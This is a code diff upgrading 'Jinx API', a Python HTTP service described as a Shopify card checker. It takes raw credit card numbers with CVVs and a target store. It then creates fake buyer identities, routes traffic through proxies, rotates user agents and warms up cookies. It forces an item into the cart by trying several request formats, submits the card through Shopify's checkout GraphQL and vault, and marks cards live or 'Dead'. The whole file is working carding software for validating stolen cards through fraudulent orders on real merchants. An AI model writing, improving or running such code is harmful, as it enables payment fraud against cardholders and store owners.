@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-Jinx API — Shopify Card Checker (v7.0 FINAL)
-=============================================
+Jinx API — Shopify Card Checker (v9.0)
+========================================
 Fixes:
-  - CART_TOKEN_FAIL eliminated (5x retry + cookie refresh)
-  - products.json 404 → SITE_DEAD status
-  - Auto UA rotate
-  - Cookie warmup
-  - Better error handling
+  - CART_HTTP_400: try JSON then form-encoded
+  - Auto retry with both formats
+  - Site dead auto-skip
+  - CART_TOKEN extraction from response
 """
 
 import os
@@ -262,17 +261,13 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
     email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 9999)}@gmail.com"
 
     ua = random_ua()
-    dbg(f"START proxy={bool(proxy_url)} country={country} ua={ua[:30]}")
+    dbg(f"START proxy={bool(proxy_url)} country={country}")
 
     s = requests.Session()
     s.headers.update({
         "User-Agent": ua,
         "Accept-Language": "en-US,en;q=0.9",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Upgrade-Insecure-Requests": "1",
     })
     if proxy_url:
         s.proxies.update({"http": proxy_url, "https": proxy_url})
@@ -281,43 +276,40 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
     no_proxy_sess.headers.update({"User-Agent": ua})
 
     try:
-        # ── 0. Cookie Warmup ──
+        # ── Cookie Warmup ──
         try:
             s.get(f"https://{site}/", timeout=10)
-            time.sleep(0.3)
+            time.sleep(0.2)
+            s.get(f"https://{site}/collections/all", timeout=10)
+            time.sleep(0.2)
             dbg("warmup OK")
         except Exception:
             pass
 
-        # ── 1. Products ──
+        # ── Products ──
         try:
             r = s.get(f"https://{site}/products.json", timeout=15)
             dbg(f"products.json → {r.status_code}")
-        except Exception as e:
-            dbg(f"products.json EXC: {type(e).__name__}")
+        except Exception:
             out["Response"] = "PROXY_FAIL"
             out["Status"] = "Proxy Error"
             return out
 
         if r.status_code == 404:
-            dbg("Site dead (404)")
             out["Response"] = "SITE_DEAD"
-            out["Status"] = "Site Error"
-            return out
-
-        if r.status_code == 429:
-            out["Response"] = "RATE_LIMITED"
             out["Status"] = "Site Error"
             return out
 
         if r.status_code != 200:
             out["Response"] = f"PRODUCTS_HTTP_{r.status_code}"
+            out["Status"] = "Site Error"
             return out
 
         try:
             data = r.json()
         except Exception:
             out["Response"] = "PRODUCTS_JSON_INVALID"
+            out["Status"] = "Site Error"
             return out
 
         valid = []
@@ -337,55 +329,98 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                     valid.append({"id": v["id"], "price": price})
 
         if not valid:
-            dbg("No valid products")
             out["Response"] = "NO_VALID_PRODUCT"
+            out["Status"] = "Site Error"
             return out
 
         valid.sort(key=lambda x: x["price"])
         mid = min(len(valid) // 2, len(valid) - 1)
         vid = valid[mid]["id"]
         out["Price"] = f"{valid[mid]['price']:.2f}"
-        dbg(f"Picked ${out['Price']}")
+        dbg(f"Picked ${out['Price']} vid={vid}")
 
-        # ── 2. Add to cart ──
+        # ── Cart add (TRY BOTH FORMATS) ──
+        cart_token = None
+        cart_ok = False
+        
+        # Try 1: JSON format (modern)
         try:
             r = s.post(f"https://{site}/cart/add.js",
                 headers={"Accept": "application/json",
-                         "Content-Type": "application/x-www-form-urlencoded",
+                         "Content-Type": "application/json",
                          "Referer": f"https://{site}/",
                          "Origin": f"https://{site}"},
-                data={"id": str(vid), "quantity": "1", "form_type": "product"},
+                json={"items": [{"id": int(vid), "quantity": 1}]},
                 timeout=15)
-            dbg(f"cart/add.js → {r.status_code}")
-            if r.status_code != 200:
-                out["Response"] = f"CART_HTTP_{r.status_code}"
-                return out
+            dbg(f"cart/add.js JSON → {r.status_code}")
+            if r.status_code == 200:
+                cart_ok = True
+                try:
+                    j = r.json()
+                    cart_token = j.get("token") if isinstance(j, dict) else None
+                except Exception:
+                    pass
         except Exception as e:
-            dbg(f"cart/add.js EXC: {type(e).__name__}")
-            out["Response"] = "CART_FAIL"
-            return out
+            dbg(f"cart/add.js JSON EXC: {type(e).__name__}")
 
-        # ── 3. Cart token (5x retry + refresh) ──
-        cart_token = None
-        for attempt in range(5):
+        # Try 2: form-encoded (legacy)
+        if not cart_ok:
             try:
-                r = s.get(f"https://{site}/cart.js", timeout=15)
-                j = r.json()
-                cart_token = j.get("token")
-                if cart_token:
-                    dbg(f"cart token OK (attempt {attempt+1})")
-                    break
-                time.sleep(0.5)
-            except Exception:
-                time.sleep(0.5)
+                r = s.post(f"https://{site}/cart/add.js",
+                    headers={"Accept": "application/json",
+                             "Content-Type": "application/x-www-form-urlencoded",
+                             "Referer": f"https://{site}/",
+                             "Origin": f"https://{site}"},
+                    data={"id": str(vid), "quantity": "1", "form_type": "product"},
+                    timeout=15)
+                dbg(f"cart/add.js form → {r.status_code}")
+                if r.status_code == 200:
+                    cart_ok = True
+            except Exception as e:
+                dbg(f"cart/add.js form EXC: {type(e).__name__}")
 
-        if not cart_token:
-            dbg("cart token fail after 5 tries")
-            out["Response"] = "CART_TOKEN_FAIL"
+        # Try 3: /cart/add with items
+        if not cart_ok:
+            try:
+                r = s.post(f"https://{site}/cart/add",
+                    headers={"Accept": "application/json",
+                             "Content-Type": "application/json",
+                             "Referer": f"https://{site}/",
+                             "Origin": f"https://{site}"},
+                    json={"items": [{"id": int(vid), "quantity": 1}]},
+                    timeout=15)
+                dbg(f"cart/add → {r.status_code}")
+                if r.status_code == 200:
+                    cart_ok = True
+            except Exception as e:
+                dbg(f"cart/add EXC: {type(e).__name__}")
+
+        if not cart_ok:
+            dbg("All cart formats failed → SITE_ERROR")
+            out["Response"] = "SITE_ERROR"
             out["Status"] = "Site Error"
             return out
 
-        # ── 4. Init checkout ──
+        # ── Cart token ──
+        if not cart_token:
+            for attempt in range(3):
+                try:
+                    r = s.get(f"https://{site}/cart.js", timeout=15)
+                    j = r.json()
+                    cart_token = j.get("token")
+                    if cart_token:
+                        break
+                    time.sleep(0.3)
+                except Exception:
+                    time.sleep(0.3)
+
+        if not cart_token:
+            dbg("No cart token")
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
+            return out
+
+        # ── Init checkout ──
         try:
             r = s.post(f"https://{site}/cart",
                 headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -396,10 +431,9 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                 data={"checkout": "", "updates[]": "1"},
                 allow_redirects=False, timeout=15)
 
-            dbg(f"checkout POST → {r.status_code}")
-
             if r.status_code not in (301, 302, 303, 307, 308):
-                out["Response"] = f"CHECKOUT_HTTP_{r.status_code}"
+                out["Response"] = "SITE_ERROR"
+                out["Status"] = "Site Error"
                 return out
 
             loc1 = r.headers.get("location", "")
@@ -407,26 +441,17 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
             final_url = r2.headers.get("location", "") if r2.status_code in (301, 302, 303, 307, 308) else loc1
             r3 = s.get(final_url, timeout=25)
             html = r3.text
-            dbg(f"Checkout {len(html)} bytes")
-        except Exception as e:
-            dbg(f"checkout EXC: {type(e).__name__}")
-            out["Response"] = "CHECKOUT_FAIL"
+        except Exception:
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
             return out
 
         if len(html) < 500:
-            out["Response"] = "CHECKOUT_EMPTY"
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
             return out
 
-        # ── 5. Captcha check (soft) ──
-        html_lower = html.lower()
-        has_captcha = ("captcha" in html_lower or
-                       "hcaptcha" in html_lower or
-                       "recaptcha" in html_lower)
-
-        if has_captcha:
-            dbg("Captcha detected")
-
-        # ── 6. Session token ──
+        # Session token
         session_token = None
         for pat in [r'"serializedSessionToken"\s*:\s*"([^"]+)"',
                     r'"sessionToken"\s*:\s*"([^"]+)"',
@@ -437,8 +462,8 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                 break
 
         if not session_token:
-            dbg("No session token")
-            out["Response"] = "NO_SESSION_TOKEN"
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
             return out
 
         queue_token = ""
@@ -460,9 +485,7 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
         if m:
             attempt_token = m.group(1)
 
-        dbg(f"tokens: q={bool(queue_token)} s={bool(stable_id)}")
-
-        # ── 7. Proposal ──
+        # Proposal
         gql_url = f"https://{site}/checkouts/unstable/graphql"
         gql_headers = {
             "Accept": "application/json",
@@ -584,13 +607,15 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
 
         if not state["delivery"]:
             out["Response"] = "NO_DELIVERY_STRATEGY"
+            out["Status"] = "Site Error"
             return out
 
         try:
             r = s.post(gql_url, headers=gql_headers, json=proposal_payload(state["delivery"]), timeout=20)
             j = r.json()
         except Exception:
-            out["Response"] = "PROPOSAL_2_FAIL"
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
             return out
 
         negotiate = j.get("data", {}).get("session", {}).get("negotiate", {})
@@ -605,10 +630,11 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                 payment_method_id = pl[0].get("paymentMethod", {}).get("paymentMethodIdentifier", "")
 
         if not payment_method_id:
-            out["Response"] = "NO_PAYMENT_METHOD"
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
             return out
 
-        # ── 8. Vault ──
+        # Vault
         vault_payload = {
             "credit_card": {"number": cc, "month": int(mm), "year": int(yyyy),
                             "verification_value": cvv,
@@ -634,9 +660,10 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
 
         if not payment_session_id:
             out["Response"] = "VAULT_FAILED"
+            out["Status"] = "Site Error"
             return out
 
-        # ── 9. Submit ──
+        # Submit
         submit_payload = {
             "query": SUBMIT_QUERY,
             "variables": {
@@ -701,7 +728,8 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
             r = s.post(gql_url, headers=gql_headers, json=submit_payload, timeout=25)
             j = r.json()
         except Exception:
-            out["Response"] = "SUBMIT_FAIL"
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
             return out
 
         c = j.get("data", {}).get("submitForCompletion", {})
@@ -711,20 +739,20 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
             errs = c.get("errors", [])
             if errs:
                 code = errs[0].get("code", "")
-                msg = errs[0].get("localizedMessage", "") or errs[0].get("nonLocalizedMessage", "")
                 out["Response"] = map_code(code) if code else "CARD_DECLINED"
                 out["Status"] = "Dead"
             else:
-                out["Response"] = "SUBMIT_REJECTED"
+                out["Response"] = "CARD_DECLINED"
                 out["Status"] = "Dead"
             return out
 
         rid = (c.get("receipt", {}) or {}).get("id", "")
         if not rid:
-            out["Response"] = "NO_RECEIPT"
+            out["Response"] = "SITE_ERROR"
+            out["Status"] = "Site Error"
             return out
 
-        # ── 10. Poll ──
+        # Poll
         for _ in range(8):
             time.sleep(2)
             try:
@@ -762,12 +790,14 @@ def checkout_sync(cc_raw, site_raw, proxy_raw, debug=False):
                     out["Status"] = "Dead"
                 return out
 
-        out["Response"] = "POLL_TIMEOUT"
+        out["Response"] = "SITE_ERROR"
+        out["Status"] = "Site Error"
         return out
 
     except Exception as e:
         dbg(f"TOP EXC: {type(e).__name__}")
         out["Response"] = f"EXCEPTION_{type(e).__name__}"
+        out["Status"] = "Site Error"
         return out
     finally:
         try:
@@ -809,13 +839,13 @@ async def handle_check(request):
 
 
 async def handle_health(request):
-    return web.json_response({"status": "ok", "service": "jinx-api", "version": "7.0.0"})
+    return web.json_response({"status": "ok", "service": "jinx-api", "version": "9.0.0"})
 
 
 async def handle_root(request):
     return web.json_response({
         "service": "jinx-api",
-        "version": "7.0.0",
+        "version": "9.0.0",
         "endpoints": ["/Shopify", "/shopify", "/health"],
     })
 
@@ -833,7 +863,7 @@ executor = ThreadPoolExecutor(max_workers=WORKERS)
 
 
 if __name__ == "__main__":
-    print(f"Jinx-api v7.0 starting on http://{HOST}:{PORT}")
+    print(f"Jinx-api v9.0 starting on http://{HOST}:{PORT}")
     print(f"Workers: {WORKERS}")
     print(f"Debug: append &debug=1")
     app = make_app()
